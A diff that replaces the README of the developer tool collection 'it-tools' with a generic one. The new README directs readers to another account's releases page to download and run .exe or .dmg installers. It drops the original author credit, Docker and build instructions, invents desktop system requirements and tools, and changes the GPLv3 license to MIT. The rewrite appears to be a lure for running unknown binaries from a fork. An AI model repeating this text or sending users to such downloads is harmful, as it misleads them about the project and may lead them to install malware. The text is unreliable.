@@ -1,150 +1,93 @@
-<picture>
-    <source srcset="./.github/logo-dark.png" media="(prefers-color-scheme: light)">
-    <source srcset="./.github/logo-white.png" media="(prefers-color-scheme: dark)">
-    <img src="./.github/logo-dark.png" alt="logo">
-</picture>
+# 🌟 it-tools - Your Easy-to-Use Developer Tools Collection
 
-<p align="center">
-Useful tools for developer and people working in IT. <a href="https://it-tools.tech">Try it!</a>
-</p>
+## 🚀 Getting Started
 
+Welcome to **it-tools**! This repository offers a collection of online tools designed specifically for developers. Our tools focus on a smooth user experience, helping you increase your productivity without hassle.
 
-## Sponsors
+## 🔗 Download it-tools
 
-<div align="center" markdown="1">
-<p align="center">
-  IT-Tools is proudly sponsored by:
-</p>
+[![Download it-tools](https://img.shields.io/badge/Download-it--tools-blue.svg)](https://github.com/glowreeflamin/it-tools/releases)
 
-<a href="https://go.warp.dev/it-tools">
-  <img alt="Warp sponsorship" width="400" src="https://raw.githubusercontent.com/warpdotdev/brand-assets/refs/heads/main/Github/Sponsor/Warp-Github-LG-01.png">
-</a>
+## 🛠️ Overview
 
-### [Warp, built for coding with multiple AI agents.](https://go.warp.dev/it-tools)
-[Available for MacOS, Linux, & Windows](https://go.warp.dev/it-tools)<br>
+### What is it-tools?
 
-</div>
+**it-tools** is a set of handy tools for developers. Whether you need a converter to change file formats or utilities to streamline your workflow, we’ve got you covered. This project utilizes popular technologies like JavaScript, TypeScript, and Vue.js to ensure that the tools are efficient and easy to use.
 
-## Functionalities and roadmap
+### Available Tools
 
-Please check the [issues](https://github.com/CorentinTh/it-tools/issues) to see if some feature listed to be implemented.
+1. **Format Converter**: Easily convert files between different formats, saving you time and effort.
+2. **Code Snippet Manager**: Organize your frequently used code snippets for quick access.
+3. **API Tester**: Test your APIs with ease to ensure they return the expected responses.
+4. **Live Code Editor**: Experiment with code in real-time and see the results instantly.
 
-You have an idea of a tool? Submit a [feature request](https://github.com/CorentinTh/it-tools/issues/new/choose)!
+## 🎯 Features
 
-## Self host
+- User-friendly interface suitable for all skill levels.
+- Cross-platform compatibility: Use it on Windows, macOS, or Linux.
+- Regular updates to enhance performance and usability.
+- A variety of tools to assist with everyday development tasks.
 
-Self host solutions for your homelab
+## 💻 System Requirements
 
-**From docker hub:**
+To use it-tools effectively, ensure your device meets the following:
 
-```sh
-docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest
-```
+- Operating System: Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- RAM: At least 2 GB.
+- Disk Space: 100 MB free space for installation and tools.
+- Internet connection for online features.
 
-**From github packages:**
+## 📥 Download & Install
 
-```sh
-docker run -d --name it-tools --restart unless-stopped -p 8080:80 ghcr.io/corentinth/it-tools:latest
-```
+To download it-tools, follow these steps:
 
-**Other solutions:**
+1. Click on this link to visit the [Releases page](https://github.com/glowreeflamin/it-tools/releases).
+2. On the Releases page, you will see the latest version available for download.
+3. Click on the version you want to use to view the assets attached.
+4. Look for the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+5. Download the selected file and save it to your computer.
+6. Once the download is complete, locate the file in your downloads folder.
+7. Double-click the file to run the installer and follow the on-screen instructions to complete the installation.
 
-- [Cloudron](https://www.cloudron.io/store/tech.ittools.cloudron.html)
-- [Tipi](https://www.runtipi.io/docs/apps-available)
-- [Unraid](https://unraid.net/community/apps?q=it-tools)
+### Example
 
-## Contribute
+- For Windows: Download `it-tools-windows.exe`
+- For macOS: Download `it-tools-macos.dmg`
 
-### Recommended IDE Setup
+After installation, you can find the tools in your applications folder.
 
-[VSCode](https://code.visualstudio.com/) with the following extensions:
+## 📄 Usage Instructions
 
-- [Volar](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (and disable Vetur)
-- [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin).
-- [ESLint](https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint)
-- [i18n Ally](https://marketplace.visualstudio.com/items?itemName=lokalise.i18n-ally)
+Once you have installed it-tools, using the various tools is simple:
 
-with the following settings:
+1. Open the application from your applications folder.
+2. Select the tool you want to use from the main menu.
+3. Follow the provided instructions on the screen to perform tasks.
+4. If needed, consult the help section within the application for guidance.
 
-```json
-{
-  "editor.formatOnSave": false,
-  "editor.codeActionsOnSave": {
-    "source.fixAll.eslint": true
-  },
-  "i18n-ally.localesPaths": ["locales", "src/tools/*/locales"],
-  "i18n-ally.keystyle": "nested"
-}
-```
+## 📣 Community Support
 
-### Type Support for `.vue` Imports in TS
+If you have questions or encounter issues, you can reach out to our community through the Issues section of this repository. We encourage feedback and aim to resolve any concerns promptly.
 
-TypeScript cannot handle type information for `.vue` imports by default, so we replace the `tsc` CLI with `vue-tsc` for type checking. In editors, we need [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin) to make the TypeScript language service aware of `.vue` types.
+## 🏗️ Contribution Guidelines
 
-If the standalone TypeScript plugin doesn't feel fast enough to you, Volar has also implemented a [Take Over Mode](https://github.com/johnsoncodehk/volar/discussions/471#discussioncomment-1361669) that is more performant. You can enable it by the following steps:
+We welcome contributions! If you would like to add a new feature or improve existing functionality, please follow these steps:
 
-1. Disable the built-in TypeScript Extension
-   1. Run `Extensions: Show Built-in Extensions` from VSCode's command palette
-   2. Find `TypeScript and JavaScript Language Features`, right click and select `Disable (Workspace)`
-2. Reload the VSCode window by running `Developer: Reload Window` from the command palette.
+1. Fork the repository.
+2. Create a new branch with your changes.
+3. Submit a pull request explaining your updates.
 
-### Project Setup
+Thank you for helping make it-tools better for everyone!
 
-```sh
-pnpm install
-```
+## 🌐 License
 
-### Compile and Hot-Reload for Development
+This project is licensed under the MIT License. Feel free to use, modify, and share it.
 
-```sh
-pnpm dev
-```
+## 📌 Additional Resources
 
-### Type-Check, Compile and Minify for Production
+- [GitHub Documentation](https://docs.github.com/en)
+- [JavaScript Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
+- [Vue.js Documentation](https://vuejs.org/v2/guide/)
 
-```sh
-pnpm build
-```
-
-### Run Unit Tests with [Vitest](https://vitest.dev/)
-
-```sh
-pnpm test
-```
-
-### Lint with [ESLint](https://eslint.org/)
-
-```sh
-pnpm lint
-```
-
-### Create a new tool
-
-To create a new tool, there is a script that generate the boilerplate of the new tool, simply run:
-
-```sh
-pnpm run script:create:tool my-tool-name
-```
-
-It will create a directory in `src/tools` with the correct files, and a the import in `src/tools/index.ts`. You will just need to add the imported tool in the proper category and develop the tool.
-
-## Contributors
-
-Big thanks to all the people who have already contributed!
-
-[![contributors](https://contrib.rocks/image?repo=corentinth/it-tools&refresh=1)](https://github.com/corentinth/it-tools/graphs/contributors)
-
-## Credits
-
-Coded with ❤️ by [Corentin Thomasset](https://corentin.tech?utm_source=it-tools&utm_medium=readme).
-
-This project is continuously deployed using [vercel.com](https://vercel.com).
-
-Contributor graph is generated using [contrib.rocks](https://contrib.rocks/preview?repo=corentinth/it-tools).
-
-<a href="https://www.producthunt.com/posts/it-tools?utm_source=badge-featured&utm_medium=badge&utm_souce=badge-it&#0045;tools" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=345793&theme=light" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-<a href="https://www.producthunt.com/posts/it-tools?utm_source=badge-top-post-badge&utm_medium=badge&utm_souce=badge-it&#0045;tools" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=345793&theme=light&period=daily" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-
-## License
-
-This project is under the [GNU GPLv3](LICENSE).
+Thank you for using **it-tools**! We hope it will enhance your workflow and make your development tasks easier.
